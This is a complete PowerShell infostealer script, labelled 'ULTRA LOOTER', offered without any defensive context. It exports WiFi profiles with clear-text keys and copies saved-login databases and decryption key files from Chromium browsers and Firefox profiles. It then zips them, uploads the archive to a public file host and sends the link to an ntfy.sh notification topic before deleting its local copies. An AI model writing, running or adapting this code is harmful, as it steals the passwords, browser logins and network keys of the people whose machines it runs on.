$topic = "data_stwealer_hideen_"

Write-Host "=== [ ULTRA LOOTER: ALL BROWSERS ] ===" -ForegroundColor Cyan

# 1. Setup
$dir = "$env:TEMP\LootBox"; $zip = "$env:TEMP\package.zip"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }; mkdir $dir | Out-Null
if (Test-Path $zip) { Remove-Item -Force $zip }

# 2. WiFi Export
Write-Host "[*] Exporting WiFi..."
netsh wlan export profile folder=$dir key=clear | Out-Null

# 3. Chromium Browsers (Chrome, Edge, Brave, Opera, Opera GX)
$chromes = @{
    "Chrome"   = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"     = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"    = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "Opera"    = "$env:APPDATA\Opera Software\Opera Stable"
    "OperaGX"  = "$env:APPDATA\Opera Software\Opera GX Stable"
}

Write-Host "[*] Collecting Chromium Data..." -ForegroundColor White
foreach ($browser in $chromes.Keys) {
    $path = $chromes[$browser]
    $loginData = "$path\Default\Login Data"
    $localState = "$path\Local State"
    
    # Opera handles paths slightly differently
    if ($browser -like "Opera*") { $loginData = "$path\Login Data" }

    if (Test-Path $loginData) {
        Copy-Item $loginData -Destination "$dir\$browser`_LoginData" -Force
        Copy-Item $localState -Destination "$dir\$browser`_LocalState" -Force
        Write-Host "    [+] Grabbed $browser" -ForegroundColor Green
    }
}

# 4. Firefox (The "Special" One)
Write-Host "[*] Searching for Firefox Profiles..." -ForegroundColor White
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    $profiles = Get-ChildItem $ffPath | Where-Object { $_.PSIsContainer }
    foreach ($p in $profiles) {
        $keyFile = Join-Path $p.FullName "key4.db"
        $loginsFile = Join-Path $p.FullName "logins.json"
        
        if (Test-Path $keyFile) {
            Copy-Item $keyFile -Destination "$dir\Firefox_$($p.Name)_key4.db" -Force
            Copy-Item $loginsFile -Destination "$dir\Firefox_$($p.Name)_logins.json" -Force
            Write-Host "    [+] Grabbed Firefox Profile: $($p.Name)" -ForegroundColor Green
        }
    }
}

# 5. Zip & Upload
Write-Host "`n[*] Packaging everything..." -ForegroundColor White
Add-Type -Assembly "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)

if (Test-Path $zip) {
    $link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
    if ($link -like "http*") {
        Write-Host "[!] SUCCESS: $link" -ForegroundColor Green
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Full Loot (All Browsers): $link"
    }
}

Read-Host "`nDebug Finished. Press Enter to clean up."
Remove-Item -Recurse -Force $dir, $zip
